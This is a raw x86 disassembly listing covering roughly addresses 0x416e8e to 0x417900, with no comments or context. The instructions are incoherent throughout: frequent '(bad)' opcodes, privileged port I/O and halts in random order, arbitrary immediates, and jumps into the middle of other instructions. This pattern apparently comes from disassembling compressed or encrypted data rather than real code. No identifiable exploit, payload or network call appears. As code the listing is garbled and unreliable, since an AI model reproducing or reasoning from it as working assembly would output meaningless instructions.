  416e8e:	xchg   DWORD PTR [edx],edx
  416e90:	sbb    eax,DWORD PTR [eax]
	...
  416ef2:	add    BYTE PTR [eax],al
  416ef4:	mov    edi,0xae6d8e19
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x469f8eea
  416f02:	mov    ds:0xf27ca6,eax
  416f07:	add    BYTE PTR ds:0x20000001,al
  416f0d:	xlat   BYTE PTR ds:[ebx]
  416f0e:	test   eax,0xbe0b05fb
  416f13:	sbb    ax,0xa3e7
  416f17:	sub    edx,DWORD PTR [ebp-0x6e]
  416f1a:	mov    eax,0x437114af
  416f1f:	ja     0x416f55
  416f21:	sub    edx,esp
  416f23:	scas   al,BYTE PTR es:[edi]
  416f24:	push   ss
  416f25:	jnp    0x416f29
  416f27:	or     dh,al
  416f29:	fisub  WORD PTR [edi-0x7]
  416f2c:	xor    BYTE PTR [ebx+eiz*2+0x2a],al
  416f30:	icebp  
  416f31:	repnz dec esp
  416f33:	imul   edx,DWORD PTR ds:0xb83a9c74,0xffffffaa
  416f3a:	int3   
  416f3b:	adc    DWORD PTR [edx-0x7a],eax
  416f3e:	pop    ecx
  416f3f:	pop    ss
  416f40:	lods   eax,DWORD PTR ds:[esi]
  416f41:	test   DWORD PTR [ebp+0x27961b94],0xdee48ff8
  416f4b:	sbb    BYTE PTR [edx],al
  416f4d:	inc    esp
  416f4e:	pop    esp
  416f4f:	sahf   
  416f50:	sbb    ebx,DWORD PTR [edx]
  416f52:	xchg   ecx,eax
  416f53:	nop
  416f54:	jecxz  0x416f80
  416f56:	xor    esi,ecx
  416f58:	push   esp
  416f59:	out    0xe8,al
  416f5b:	sbb    esi,0x6c
  416f5e:	adc    eax,0xac9a2c09
  416f63:	popf   
  416f64:	sar    bl,1
  416f66:	fldcw  WORD PTR [esi]
  416f68:	fwait
  416f69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f6a:	inc    ebx
  416f6b:	add    DWORD PTR ds:0x356f5e52,0x40
  416f72:	pop    edx
  416f73:	fisubr DWORD PTR [eax-0x4ba9cb88]
  416f79:	test   al,0xb7
  416f7b:	(bad)  
  416f7c:	sbb    eax,0xc71dfc8c
  416f81:	aad    0x78
  416f83:	sub    DWORD PTR [esi+0x24677fc1],ebx
  416f89:	(bad)  
  416f8a:	jp     0x416f10
  416f8c:	aas    
  416f8d:	rol    edi,1
  416f8f:	out    0xd5,al
  416f91:	sub    al,0xcd
  416f93:	adc    eax,0x51e6ecc6
  416f98:	sbb    eax,ecx
  416f9a:	out    0xe1,al
  416f9c:	sbb    BYTE PTR [esi],ch
  416f9e:	mov    BYTE PTR ds:0x371a1728,ah
  416fa4:	mov    edx,0x10ece098
  416fa9:	pop    ds
  416faa:	add    edi,0xffffffc3
  416fad:	dec    edi
  416fae:	jnp    0x416fe2
  416fb0:	xor    eax,0xdf10c788
  416fb5:	sbb    ch,BYTE PTR [edx]
  416fb7:	arpl   WORD PTR [eax-0x56fd8319],sp
  416fbd:	icebp  
  416fbe:	adc    al,0xe7
  416fc0:	add    al,0x4c
  416fc2:	mov    dh,0xb
  416fc4:	sbb    eax,edx
  416fc6:	or     BYTE PTR [edi+eax*2],dl
  416fc9:	sub    eax,0xdc7580f2
  416fce:	pop    ecx
  416fcf:	mov    ah,0x14
  416fd1:	fmul   DWORD PTR [eax+0x74]
  416fd4:	dec    ebx
  416fd5:	shr    al,1
  416fd7:	cmovp  edx,DWORD PTR [ecx]
  416fda:	mov    ebp,0x7803e0e6
  416fdf:	nop
  416fe0:	mov    ebp,0x4b46267b
  416fe5:	rol    DWORD PTR [edi],0x1d
  416fe8:	sar    BYTE PTR [edx+edi*1+0x14f2737],cl
  416fef:	cmp    edx,ecx
  416ff1:	xchg   esp,eax
  416ff2:	(bad)  
  416ff3:	xchg   esp,eax
  416ff4:	je     0x416fef
  416ff6:	cli    
  416ff7:	stos   DWORD PTR es:[edi],eax
  416ff8:	fsubr  st(6),st
  416ffa:	mov    bl,0xbc
  416ffc:	mov    ds:0x8af5f22b,eax
  417001:	adc    al,0xb5
  417003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417004:	jle    0x416fa1
  417006:	pop    edx
  417007:	push   ds
  417008:	push   esi
  417009:	popa   
  41700a:	dec    ecx
  41700b:	pop    edx
  41700c:	or     eax,0x641f4a30
	...
  417071:	add    BYTE PTR [eax],al
  417073:	add    BYTE PTR [esi+0x2d],dh
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    ecx,edi
  417081:	lods   eax,DWORD PTR ds:[esi]
  417082:	pop    esi
  417083:	bound  eax,QWORD PTR [ecx+0x50000f3]
  417089:	add    DWORD PTR [eax],eax
  41708b:	add    BYTE PTR [edi],dh
  41708d:	fsub   QWORD PTR [edx-0x73]
  417090:	dec    ecx
  417091:	cmc    
  417092:	out    dx,al
  417093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417094:	push   ebx
  417095:	cdq    
  417096:	imul   eax
  417098:	and    DWORD PTR ds:0xdcea3b5b,ecx
  41709e:	dec    edx
  41709f:	in     al,0x1b
  4170a1:	mov    ds:0x76dc769b,ax
  4170a7:	push   esi
  4170a8:	pop    edi
  4170a9:	in     eax,dx
  4170aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170ab:	ret    0x299
  4170ae:	jmp    0x484f0bf7
  4170b3:	sub    eax,DWORD PTR [ecx-0x58]
  4170b6:	test   DWORD PTR [ebp+0x53],ebp
  4170b9:	adc    esp,DWORD PTR [eax+0x2d603b7b]
  4170bf:	lds    eax,FWORD PTR [esp+eax*4-0x51ccf5cf]
  4170c6:	xchg   ecx,eax
  4170c7:	pop    es
  4170c8:	mov    al,ds:0x321d3649
  4170cd:	xlat   BYTE PTR ds:[ebx]
  4170ce:	mov    esp,edx
  4170d0:	out    0xbf,al
  4170d2:	xlat   BYTE PTR ds:[ebx]
  4170d3:	mov    gs:0x8d750c61,al
  4170d9:	clc    
  4170da:	or     eax,ebp
  4170dc:	sbb    al,BYTE PTR [ebp-0x18]
  4170df:	fld    QWORD PTR [edx-0x741140e8]
  4170e5:	push   esi
  4170e6:	or     edx,DWORD PTR [edi+0x1a]
  4170e9:	ss ds push eax
  4170ec:	sbb    al,0x69
  4170ee:	aas    
  4170ef:	push   ds
  4170f0:	inc    ebx
  4170f1:	xchg   ebx,eax
  4170f2:	push   cs
  4170f3:	sub    DWORD PTR [ebx-0x299d52f5],edx
  4170f9:	enter  0xbd2c,0x3
  4170fd:	mov    dh,0x61
  4170ff:	loop   0x4170c7
  417101:	jae    0x417129
  417103:	shr    BYTE PTR [ebx-0x43],cl
  417106:	nop
  417107:	mov    edi,DWORD PTR [ebp+edx*4-0x5c505b9d]
  41710e:	or     ebp,esi
  417110:	mov    eax,ds:0xef34c3da
  417115:	mov    ah,0x53
  417117:	adc    BYTE PTR [ebx-0x8],0xaa
  41711b:	cwde   
  41711c:	sub    DWORD PTR [esi],ebx
  41711e:	mov    al,0x39
  417120:	mov    eax,0x6fdaae6e
  417125:	mov    ecx,DWORD PTR [esi-0x36e277d9]
  41712b:	jmp    DWORD PTR [eax]
  41712d:	adc    edx,0xc92b0c9b
  417133:	mov    edi,0x33f0cf2e
  417138:	out    0x9d,eax
  41713a:	cld    
  41713b:	sub    eax,0x4601168e
  417140:	mov    ax,ds:0x56a41a94
  417146:	rcl    BYTE PTR [eax-0x7e],cl
  417149:	push   cs
  41714a:	adc    DWORD PTR [esi+0x43],ecx
  41714d:	stos   BYTE PTR es:[edi],al
  41714e:	mov    ch,0xb3
  417150:	into   
  417151:	leave  
  417152:	inc    ebp
  417153:	mov    al,ds:0xdc14b4d
  417158:	lea    ecx,[esi]
  41715a:	jbe    0x417175
  41715c:	and    eax,0xc8247a8d
  417161:	aas    
  417162:	mov    ecx,eax
  417164:	jo     0x417192
  417166:	mov    eax,0x22c6df1f
  41716b:	icebp  
  41716c:	iret   
  41716d:	adc    WORD PTR [ebx],0x41
  417171:	lods   al,BYTE PTR ds:[esi]
  417172:	rol    BYTE PTR [esi+ecx*1-0x170c9bfe],1
  417179:	push   edi
  41717a:	outs   dx,BYTE PTR ds:[esi]
  41717b:	imul   ebp,DWORD PTR [esi+esi*4],0x6977dc10
  417182:	mov    esi,DWORD PTR [eax+0xd49bdba]
  417188:	shl    DWORD PTR [ebx-0x6972a3ed],0xb9
  41718f:	clc    
  417190:	lahf   
	...
  4171f1:	add    BYTE PTR [eax],al
  4171f3:	add    BYTE PTR [esi-0xe58fe7],ah
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	cmp    dh,ah
  417202:	rcr    BYTE PTR [ecx],1
  417204:	xchg   ah,dh
  417206:	add    BYTE PTR [eax],al
  417208:	add    eax,0x66000001
  41720d:	(bad)  
  41720e:	sub    esp,eax
  417210:	cmp    al,0xee
  417212:	fsin   
  417214:	sbb    eax,0xa52e7ffd
  417219:	icebp  
  41721a:	shl    DWORD PTR [edx-0x20],cl
  41721d:	sbb    al,0x50
  41721f:	xor    eax,0x612ab550
  417224:	in     eax,dx
  417225:	out    0xdc,eax
  417227:	leave  
  417228:	(bad)  
  417229:	xchg   ebp,eax
  41722a:	int3   
  41722b:	mov    al,ds:0xc242c26f
  417230:	pop    edi
  417231:	(bad)  
  417232:	gs push edi
  417234:	fisttp WORD PTR [edx+ecx*1]
  417237:	ins    BYTE PTR es:[edi],dx
  417238:	cs ret 0xf32f
  41723c:	ss sbb eax,0x3085c942
  417242:	dec    edi
  417243:	repz inc edi
  417245:	mov    cl,0x9b
  417247:	arpl   WORD PTR [edi+esi*2-0x68b8e647],ax
  41724e:	addr16 mov dl,0x97
  417251:	fs jge 0x41721a
  417254:	xor    al,0x3e
  417256:	je     0x41725f
  417258:	xor    ah,BYTE PTR [esi-0x8]
  41725b:	clc    
  41725c:	ret    
  41725d:	outs   dx,BYTE PTR ds:[esi]
  41725e:	jmp    0xb8fe:0xa9f48b5b
  417265:	out    0x90,al
  417267:	jne    0x41724e
  417269:	push   cs
  41726a:	(bad)  
  41726b:	cmp    ebx,edx
  41726d:	push   eax
  41726e:	inc    ebx
  41726f:	repz and bl,bl
  417272:	pop    ds
  417273:	repnz pop esp
  417275:	and    eax,esi
  417277:	retf   0x4f65
  41727a:	adc    eax,0x6ed4d6a2
  41727f:	(bad)  
  417281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417282:	pop    es
  417283:	pop    DWORD PTR [ebx+0x71]
  417286:	fcmove st,st(4)
  417288:	lods   al,BYTE PTR ds:[esi]
  417289:	and    al,0xa7
  41728b:	cli    
  41728c:	dec    edi
  41728d:	jle    0x4172d3
  41728f:	sbb    BYTE PTR [ebp+eax*8-0x1c],bl
  417293:	dec    esp
  417294:	ret    
  417295:	mov    al,0xfd
  417297:	gs cld 
  417299:	(bad)
  41729d:	les    eax,FWORD PTR [ebx-0x2d]
  4172a0:	mov    DWORD PTR [edx],edx
  4172a2:	cdq    
  4172a3:	aas    
  4172a4:	pop    edx
  4172a5:	into   
  4172a6:	push   ecx
  4172a7:	xchg   ebp,eax
  4172a8:	mov    ?,esp
  4172aa:	dec    ebp
  4172ab:	leave  
  4172ac:	(bad)  
  4172ae:	ret    0xdc5f
  4172b1:	xchg   DWORD PTR [edx],edi
  4172b3:	fdivr  QWORD PTR [esi+0x116532d]
  4172b9:	xchg   DWORD PTR [ebx-0x6ad374b9],edi
  4172bf:	xor    ebp,DWORD PTR [ebx]
  4172c1:	repnz pop ss
  4172c3:	xchg   edi,eax
  4172c4:	jae    0x4172ab
  4172c6:	ss bnd js 0x4172bb
  4172ca:	int    0xfa
  4172cc:	shr    DWORD PTR [ebp-0x4ffafa04],1
  4172d2:	scas   eax,DWORD PTR es:[edi]
  4172d3:	sub    DWORD PTR ds:0x8442a16d,esp
  4172d9:	push   ebp
  4172da:	mov    edx,DWORD PTR [ebx-0x2b484db]
  4172e0:	push   eax
  4172e1:	xchg   esi,eax
  4172e2:	inc    esi
  4172e3:	out    0x73,al
  4172e5:	out    0x1,eax
  4172e7:	test   eax,0xb7dad8fa
  4172ec:	std    
  4172ed:	and    eax,0xa7b5b6d3
  4172f2:	sbb    BYTE PTR [ecx-0x2a],al
  4172f5:	daa    
  4172f6:	fadd   QWORD PTR [edi+0x3504dcbc]
  4172fc:	(bad)  
  4172fd:	xchg   edi,eax
  4172fe:	or     ecx,DWORD PTR [eax+0x569c280a]
  417304:	cdq    
  417305:	sar    DWORD PTR [esi+0x69],cl
  417308:	xor    ah,ch
  41730a:	ins    DWORD PTR es:[edi],dx
  41730b:	dec    ebx
  41730c:	sub    eax,0x7e12a31f
	...
  417371:	add    BYTE PTR [eax],al
  417373:	add    BYTE PTR [ecx-0x44],ch
  417376:	xlat   BYTE PTR ds:[ebx]
  417377:	pop    esi
  417378:	xlat   BYTE PTR ds:[ebx]
  417379:	jg     0x417364
  41737b:	mov    edi,0x6508016b
  417380:	and    BYTE PTR [ecx+eax*8+0xf58ba5],cl
  417387:	add    BYTE PTR ds:0xd0000001,al
  41738d:	hlt    
  41738e:	and    eax,0x76a66f7a
  417393:	je     0x4173b4
  417395:	sub    bl,dh
  417397:	lea    esi,[ecx]
  417399:	mov    ecx,0x73e9776c
  41739e:	aas    
  41739f:	inc    ebx
  4173a0:	push   ecx
  4173a1:	sub    dl,BYTE PTR [ebx+0x2df77fda]
  4173a7:	or     ebp,DWORD PTR [eax]
  4173a9:	in     al,dx
  4173aa:	and    BYTE PTR [edx],cl
  4173ac:	pop    ss
  4173ad:	push   ds
  4173ae:	push   ds
  4173af:	rol    BYTE PTR [ecx],1
  4173b1:	(bad)  
  4173b2:	adc    eax,0x50ea628b
  4173b7:	imul   ecx,DWORD PTR [edx-0x2504c225],0x33
  4173be:	shr    BYTE PTR [edx+0x70b397a5],0x66
  4173c5:	pop    ss
  4173c6:	pop    ds
  4173c7:	xchg   edi,eax
  4173c8:	push   edi
  4173c9:	inc    edi
  4173ca:	sbb    BYTE PTR [eax-0xf2f54c6],ch
  4173d0:	mov    ecx,0x1b1fa926
  4173d5:	les    esp,FWORD PTR [ecx+0x6920c1b3]
  4173db:	jecxz  0x4173a5
  4173dd:	aad    0x3c
  4173df:	shl    BYTE PTR [ebp+0x64aece50],1
  4173e5:	test   BYTE PTR [ecx+esi*1+0x18],bh
  4173e9:	jg     0x417468
  4173eb:	xchg   ebx,eax
  4173ec:	imul   eax,ecx,0x3f
  4173ef:	xchg   ebx,eax
  4173f0:	(bad)  
  4173f1:	ins    DWORD PTR es:[edi],dx
  4173f2:	in     ax,0xe2
  4173f5:	(bad)  
  4173f6:	jo     0x417475
  4173f8:	repz pop esp
  4173fa:	xor    BYTE PTR [ecx],0x9c
  4173fd:	or     al,cl
  4173ff:	mov    bl,0xfd
  417401:	sbb    edx,ecx
  417403:	adc    dh,BYTE PTR [eax]
  417405:	hlt    
  417406:	push   eax
  417407:	xor    al,0x7f
  417409:	and    al,0x45
  41740b:	ret    0xa288
  41740e:	call   FWORD PTR [ebp-0x27258e9f]
  417414:	xor    al,0x31
  417416:	ss hlt 
  417418:	aas    
  417419:	addr16 aaa 
  41741b:	push   ds
  41741c:	aam    0xea
  41741e:	iret   
  41741f:	lods   al,BYTE PTR ds:[esi]
  417420:	dec    edx
  417421:	inc    esi
  417422:	ins    DWORD PTR es:[edi],dx
  417423:	jp     0x4173bf
  417425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417426:	sbb    BYTE PTR [ebx],bh
  417428:	jno    0x41741c
  41742a:	push   cs
  41742b:	imul   eax,DWORD PTR [ebp+0x6d1753d9],0xad4074c
  417435:	inc    ebx
  417436:	push   ebx
  417437:	cmp    dh,BYTE PTR [edi]
  417439:	cmp    eax,0x505e25cd
  41743e:	fwait
  41743f:	and    al,0x92
  417441:	sbb    DWORD PTR [esi],esp
  417443:	jbe    0x4174bc
  417445:	xchg   DWORD PTR [ebx],edx
  417447:	add    ebp,DWORD PTR [ecx+0x28aeb60f]
  41744d:	imul   esp,DWORD PTR [edx+ebx*1],0x71
  417451:	(bad)  
  417452:	sbb    eax,0x1eca9b5c
  417457:	ret    0x4063
  41745a:	pusha  
  41745b:	cmp    DWORD PTR [ecx],ecx
  41745d:	mov    bl,0xca
  41745f:	ret    
  417460:	(bad)  
  417461:	js     0x4174e1
  417463:	bound  ebx,QWORD PTR [edx]
  417465:	cmp    dh,BYTE PTR [esi-0x5d]
  417468:	pop    ds
  417469:	pop    es
  41746a:	sub    eax,0xfe80c72f
  41746f:	imul   edi,DWORD PTR [esi],0xffffff9c
  417472:	hlt    
  417473:	sub    al,0x9
  417475:	scas   al,BYTE PTR es:[edi]
  417476:	stos   BYTE PTR es:[edi],al
  417477:	repnz mov esp,0x9cb4cdd7
  41747d:	rol    DWORD PTR [esi+esi*4],1
  417480:	or     al,0xe7
  417482:	ja     0x4174e9
  417484:	stos   BYTE PTR es:[edi],al
  417485:	inc    edx
  417486:	retf   
  417487:	mov    dl,BYTE PTR [ebx+esi*4-0x8fba3a8]
  41748e:	cmp    dl,ch
  417490:	jp     0x417492
	...
  4174f2:	add    BYTE PTR [eax],al
  4174f4:	xchg   ecx,eax
  4174f5:	mov    edx,0xdc6b0c6a
  4174fa:	idiv   DWORD PTR [edi+0x212a686b]
  417500:	jl     0x4174b4
  417502:	aad    0xca
  417504:	nop
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    eax,0x26000001
  41750d:	ror    eax,0xe4
  417510:	jnp    0x4174ff
  417512:	fs and al,0xcc
  417515:	pushf  
  417516:	xchg   ebp,eax
  417517:	push   DWORD PTR [ecx+0x2c]
  41751a:	rcr    DWORD PTR [edx],1
  41751c:	mov    ecx,0xf22cdf47
  417521:	push   ss
  417522:	xchg   ebp,eax
  417523:	lods   al,BYTE PTR ds:[esi]
  417524:	fbstp  TBYTE PTR [edi]
  417526:	mov    eax,ss:0x194cc039
  41752c:	in     eax,dx
  41752d:	lock dec edi
  41752f:	loopne 0x4174fe
  417531:	mov    ds:0xac34c01d,al
  417536:	addr16 sbb al,0xba
  417539:	or     eax,0x297931f4
  41753e:	xlat   BYTE PTR ds:[ebx]
  41753f:	fbstp  TBYTE PTR ds:0x64bd1473
  417545:	sbb    ecx,DWORD PTR [edi+0x28]
  417548:	adc    DWORD PTR [ebx],ecx
  41754a:	data16 jg 0x41751f
  41754d:	clc    
  41754e:	sub    ebp,DWORD PTR [edx]
  417550:	shl    DWORD PTR [ecx-0x5ba3866e],1
  417556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417557:	shr    BYTE PTR [ebx],cl
  417559:	jae    0x4175be
  41755b:	out    0x3c,eax
  41755d:	jbe    0x4175dd
  41755f:	fnsave [esi+0xe]
  417562:	lahf   
  417563:	add    ch,bh
  417565:	aad    0x6d
  417567:	mov    edx,0x8d316421
  41756c:	test   eax,0x1aa2465c
  417571:	push   edi
  417572:	mov    eax,0x2925c1f4
  417577:	adc    dl,BYTE PTR [ecx-0x79]
  41757a:	outs   dx,DWORD PTR ds:[esi]
  41757b:	in     eax,0x89
  41757d:	jb     0x417585
  41757f:	or     eax,0xbdc0a8f3
  417584:	pop    ecx
  417585:	popf   
  417586:	idiv   BYTE PTR [ecx+0x97f9375]
  41758c:	repz into 
  41758e:	dec    esp
  41758f:	push   ecx
  417590:	push   esp
  417591:	jge    0x4175ae
  417593:	es push cs
  417595:	(bad)  
  417596:	dec    eax
  417597:	aad    0xbb
  417599:	sub    esp,DWORD PTR [esi+0x2595bd73]
  41759f:	xor    eax,0x351d1a1a
  4175a4:	mov    dh,0x9e
  4175a6:	out    0xf3,eax
  4175a8:	cli    
  4175a9:	dec    eax
  4175aa:	fldcw  WORD PTR [ecx]
  4175ac:	adc    esi,DWORD PTR [eax+0x1d]
  4175af:	in     al,dx
  4175b0:	mov    bh,0xf4
  4175b2:	outs   dx,BYTE PTR ds:[esi]
  4175b3:	in     al,dx
  4175b4:	push   esi
  4175b5:	jbe    0x417618
  4175b7:	inc    esp
  4175b8:	or     DWORD PTR [eax+0x7d1f368],eax
  4175be:	push   0xbb548366
  4175c3:	ss xchg al,cl
  4175c6:	or     ebx,ebx
  4175c8:	(bad)  
  4175c9:	daa    
  4175ca:	sti    
  4175cb:	sbb    BYTE PTR [edi+eax*2],cl
  4175ce:	sub    edi,eax
  4175d0:	dec    ebx
  4175d1:	loopne 0x41759c
  4175d3:	or     eax,0x2e049616
  4175d8:	out    dx,eax
  4175d9:	adc    ch,dh
  4175db:	aam    0xf4
  4175dd:	or     BYTE PTR [edx+0x81d54e6],dl
  4175e3:	add    DWORD PTR [ecx+0x7c],esi
  4175e6:	add    al,0x6e
  4175e8:	push   eax
  4175e9:	xor    edi,DWORD PTR ds:0xee730283
  4175ef:	mov    eax,ds:0xe82f058e
  4175f4:	iret   
  4175f5:	retf   
  4175f6:	repz data16 or BYTE PTR [eax],ah
  4175fa:	aas    
  4175fb:	sub    bl,BYTE PTR [ecx+0x42]
  4175fe:	push   ds
  4175ff:	ret    
  417600:	jae    0x4175af
  417602:	cmp    ebx,edx
  417604:	(bad)  
  417605:	xchg   edx,eax
  417606:	adc    ah,dl
  417608:	lods   al,BYTE PTR ds:[esi]
  417609:	sbb    al,BYTE PTR [edx-0x39f40b3e]
  41760f:	mov    eax,0x4
	...
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fcmovbe st,st(1)
  417681:	ins    DWORD PTR es:[edi],dx
  417682:	scas   eax,DWORD PTR es:[edi]
  417683:	and    DWORD PTR [ebp+0x50000f7],edx
  417689:	add    DWORD PTR [eax],eax
  41768b:	add    bl,cl
  41768d:	inc    ecx
  41768e:	imul   DWORD PTR [edx]
  417690:	pop    edx
  417691:	lods   al,BYTE PTR ds:[esi]
  417692:	aas    
  417693:	xchg   esp,eax
  417694:	je     0x4176fb
  417696:	xchg   ebp,eax
  417697:	enter  0xe01e,0xdc
  41769b:	pop    edx
  41769d:	sar    al,0xa7
  4176a0:	ja     0x417696
  4176a2:	jne    0x41764d
  4176a4:	jge    0x417709
  4176a6:	stc    
  4176a7:	clc    
  4176a8:	mov    ecx,0xe691d2e1
  4176ad:	xchg   edi,eax
  4176ae:	sub    eax,0x240e5ad8
  4176b3:	mov    ds:0x4e1d6707,al
  4176b8:	(bad)  
  4176b9:	dec    ebp
  4176ba:	cmp    al,0xc6
  4176bc:	aas    
  4176bd:	mov    ah,0xd8
  4176bf:	fwait
  4176c0:	jp     0x4176a8
  4176c2:	inc    edi
  4176c3:	(bad)  
  4176c6:	add    BYTE PTR [edx+0x45],dh
  4176c9:	pmullw mm5,QWORD PTR ds:0xcb8dd924
  4176d0:	mov    esp,DWORD PTR [esi-0x62efa65f]
  4176d6:	inc    esi
  4176d7:	in     eax,0xdc
  4176d9:	mov    eax,0xdb98d1b2
  4176de:	cs jb  0x4176bd
  4176e1:	cmp    eax,0x5e3ed90a
  4176e6:	je     0x417695
  4176e8:	pop    es
  4176e9:	cmc    
  4176ea:	repz xchg esp,eax
  4176ec:	stos   BYTE PTR es:[edi],al
  4176ed:	int3   
  4176ee:	lods   al,BYTE PTR ds:[esi]
  4176ef:	xor    esi,0x69
  4176f2:	jle    0x417734
  4176f4:	push   eax
  4176f5:	test   BYTE PTR [eax+0x63],dh
  4176f8:	adc    eax,0xfdde0fa1
  4176fd:	mov    edi,0xf4fe7928
  417702:	push   0xffffffd2
  417704:	xor    ah,BYTE PTR [ebx-0x76]
  417707:	cmp    eax,0x6916c71e
  41770c:	in     eax,dx
  41770d:	ja     0x41772f
  41770f:	cli    
  417710:	pop    ecx
  417711:	push   ebx
  417712:	mov    esi,0x7518b7b8
  417717:	or     al,0x9f
  417719:	adc    eax,0xc43459f9
  41771e:	ret    0x3c5a
  417721:	popf   
  417722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417723:	lock jecxz 0x417761
  417726:	enter  0x211c,0x3e
  41772a:	lock cmp eax,0x97410b2e
  417730:	jno    0x4176ec
  417732:	pop    ebx
  417733:	pop    esi
  417734:	je     0x417755
  417736:	adc    ebx,DWORD PTR [edi+0x53]
  417739:	adc    al,0xc1
  41773b:	lods   eax,DWORD PTR ds:[esi]
  41773c:	cmp    BYTE PTR ds:0xe7e5f58b,bh
  417742:	mov    edx,0xd7cc1871
  417747:	arpl   WORD PTR [edi+ecx*2+0x2b215703],cx
  41774e:	popa   
  41774f:	loop   0x417786
  417751:	out    dx,eax
  417752:	add    eax,DWORD PTR [ebx+0x3d0fa816]
  417758:	fcmovnb st,st(1)
  41775a:	pop    es
  41775b:	pop    ebp
  41775c:	(bad)  
  41775d:	xchg   esp,eax
  41775e:	push   esp
  41775f:	sbb    BYTE PTR [ecx+0x31c24a16],ch
  417765:	adc    cl,BYTE PTR [ecx+0x53]
  417768:	shl    BYTE PTR [esi],1
  41776a:	(bad)  
  41776b:	popf   
  41776c:	mov    ch,0xe5
  41776e:	sti    
  41776f:	aas    
  417770:	sub    al,0xd
  417772:	into   
  417773:	fdivp  st(2),st
  417775:	frstor [ebx+0x3]
  417778:	push   0x19
  41777a:	out    0x40,al
  41777c:	or     ebp,ecx
  41777e:	dec    edi
  41777f:	(bad)  
  417780:	xchg   esi,eax
  417781:	aas    
  417782:	popa   
  417783:	cmp    BYTE PTR [ebx],cl
  417785:	pop    ss
  417786:	popf   
  417787:	adc    BYTE PTR [ebp-0x9],al
  41778a:	push   ss
  41778b:	test   bl,bh
  41778d:	ins    DWORD PTR es:[edi],dx
  41778e:	rol    DWORD PTR [edx-0x2e],0x0
	...
  4177f2:	add    BYTE PTR [eax],al
  4177f4:	jmp    0xff597607
  4177f9:	imul   ecx
  4177fb:	(bad)  
  4177fc:	lahf   
  4177fd:	repnz and dl,dl
  417800:	sub    DWORD PTR [esi-0x27],eax
  417803:	call   0x105:0xf89a
  41780a:	add    BYTE PTR [eax],al
  41780c:	cmp    DWORD PTR [ebx-0x77f2ed90],esp
  417812:	mov    al,ds:0x98f7ed5d
  417817:	sbb    ah,BYTE PTR [ecx]
  417819:	outs   dx,BYTE PTR ds:[esi]
  41781a:	jg     0x4177cd
  41781c:	mov    esi,0x1a1cb1af
  417821:	cs sub al,0xf9
  417824:	retf   0x37be
  417827:	fs call 0x8d332c9b
  41782d:	jns    0x41785e
  41782f:	adc    bl,dh
  417831:	and    BYTE PTR [edi],cl
  417833:	clc    
  417834:	in     eax,0x24
  417836:	data16 aam 0x94
  417839:	call   DWORD PTR [edx+0x6b4aed32]
  41783f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417840:	cwde   
  417841:	es fs stos BYTE PTR es:[edi],al
  417844:	sti    
  417845:	retf   0xf07d
  417848:	add    al,0x2c
  41784a:	xchg   ebp,eax
  41784b:	fidiv  WORD PTR [esi-0x393e05e7]
  417851:	mov    eax,ds:0x1f0bd7b8
  417856:	ins    BYTE PTR es:[edi],dx
  417857:	mov    ds:0xe1d76e1c,al
  41785c:	jg     0x41782e
  41785e:	shr    DWORD PTR [edx+eax*2],cl
  417861:	ins    BYTE PTR es:[edi],dx
  417862:	xchg   edi,eax
  417863:	imul   esp,DWORD PTR [ebx],0x1113cddd
  417869:	sub    DWORD PTR [ebx],ecx
  41786b:	xor    DWORD PTR [edx+0x6d],ebx
  41786e:	nop
  41786f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417870:	in     al,0xe
  417872:	xor    ebp,DWORD PTR ds:0x16766f73
  417878:	add    BYTE PTR [ecx-0x11],al
  41787b:	(bad)  
  41787c:	mov    ecx,0xc8b4ef0e
  417881:	xchg   esi,eax
  417882:	or     BYTE PTR [esi+edx*4],0x3e
  417886:	add    BYTE PTR [ecx],bh
  417888:	cld    
  417889:	and    ah,0x43
  41788c:	add    DWORD PTR [ebp+0x7a369491],ebp
  417892:	mov    dh,BYTE PTR [eax]
  417894:	mov    ch,ch
  417896:	(bad)  
  417897:	stos   DWORD PTR es:[edi],eax
  417898:	cwde   
  417899:	imul   edx,DWORD PTR [ebx],0xf8cce2d4
  41789f:	mov    bh,0xf8
  4178a1:	jo     0x4178da
  4178a3:	xchg   dh,dl
  4178a5:	cdq    
  4178a6:	imul   ecx,DWORD PTR [esi],0x52
  4178a9:	jp     0x4178a2
  4178ab:	imul   ebx,esi,0x15
  4178ae:	cmp    eax,0x11eb8e42
  4178b3:	fs push ebp
  4178b5:	add    esp,DWORD PTR [edi]
  4178b7:	lods   eax,DWORD PTR ds:[esi]
  4178b8:	jo     0x41788f
  4178ba:	mov    edi,0xc8f19761
  4178bf:	ins    BYTE PTR es:[edi],dx
  4178c0:	int    0xf0
  4178c2:	mov    ds:0x20f692c,eax
  4178c7:	jp     0x4178f2
  4178c9:	jo     0x4178be
  4178cb:	sub    DWORD PTR [edi],0x50a84cb7
  4178d1:	ja     0x4178d0
  4178d3:	mov    cl,0xc9
  4178d5:	add    BYTE PTR [eax],cl
  4178d7:	mov    ah,dh
  4178d9:	mov    bh,0x1f
  4178db:	push   0xa0d57793
  4178e0:	mov    esi,0x55f7bcc8
  4178e5:	fidiv  WORD PTR [ebp+0x2d212847]
  4178eb:	cli    
  4178ec:	lds    edx,FWORD PTR [eax]
  4178ee:	test   DWORD PTR [edi-0x38],0xcd7a7216
  4178f5:	nop
  4178f6:	iret   
  4178f7:	xor    al,0x94
  4178f9:	xchg   ebp,eax
  4178fa:	pop    es
  4178fb:	sbb    eax,0x518b3cc2
  417900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
